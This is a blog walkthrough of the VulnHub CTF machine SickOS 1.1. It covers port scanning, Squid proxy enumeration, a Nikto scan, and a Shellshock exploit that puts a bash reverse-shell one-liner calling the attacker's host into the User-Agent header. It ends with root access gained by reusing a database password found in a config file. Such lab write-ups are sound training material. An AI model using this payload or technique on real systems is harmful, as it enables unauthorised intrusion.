---
layout: blog_item
title:  "SickOS 1.1 - Walkthrough"
date:   2015-12-11 11:00:10
author: Arr0way
description: 'SickOS 1.1 - Walkthrough / Writeup'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.

**Author:** [@D4rk36](https://twitter.com/D4rk36)

**Download:** [VulnHub](https://www.vulnhub.com)


## Host Enumeration

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.138

{% endhighlight %}


### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 3128</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP-Proxy</p></pc>
           </td>
           <td>
               <pc><p>Squid http proxy 3.1.19</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>

## Squid Enumeration

Inspection of Squid using the metasploit module <code>auxiliary/scanner/http/squid_pivot_scanning</code> discovered port 80 was exposed via the proxy.

![Metasploit Squid Pivot Scanning](/img/blog/sickos/metasploit-squid-pivot-scanning.png)


## Nikto scan via Proxy

Nikto was configured to use the discovered Squid proxy:

{% highlight bash %}

[root:~]# nikto -h 192.168.221.138 -useproxy http://192.168.221.138:3128

{% endhighlight %}

Nikto disclosed the location <code>/cgi-bin/status</code>, indicating the target could be vulnerable to **shellshock**.

![Nikto Proxy Scan](/img/blog/sickos/nikto-proxy-scan.png)


## Shellshock Bash Reverse Shell

**Burp Suite** was used to manipulate <code>User-Agent:</code> to include the bash reverse shell.

{% highlight bash %}
() { ignored;};/bin/bash -i >& /dev/tcp/192.168.221.139/443 0>&1
{% endhighlight %}


![Burp Suite Shellshock Reverse Bash Shell](/img/blog/sickos/burp-shellshock-reverse-shell.png)

A reverse shell was established:

{% highlight bash %}

[root:~]# nc.traditional -lp 443 -vvv
listening on [any] 443 ...

192.168.221.138: inverse host lookup failed: Unknown host
connect to [192.168.221.139] from (UNKNOWN) [192.168.221.138] 59815
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$

{% endhighlight %}


## Local Enumeration

Local enumeration of the system disclosed the file <code>/var/www/wolfcms/config.php</code> containing:

{% highlight bash %}
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
{% endhighlight %}

## Local Privilege Escalation

The previously discovered credentials worked for MySQL root, and were reused for the user <code>sickos</code> and again for <code>sudo</code> as the user <code>sickos</code>.

Local Privilege Escalation:

{% highlight bash %}

www-data@SickOs:/$ su - sickos
su - sickos
Password: john@123

sickos@SickOs:~$ ls
ls
sickos@SickOs:~$ cat .bash_history
cat .bash_history
sudo su
exit
sickos@SickOs:~$ sudo -s
sudo -s
[sudo] password for sickos: john@123

root@SickOs:~# cd /root  
cd /root
root@SickOs:/root# ls
ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


root@SickOs:/root#

{% endhighlight %}

### Root Flag

![Sickos 1.1 Root Flag](/img/blog/sickos/root-flag.png)

Thanks for the VM :)
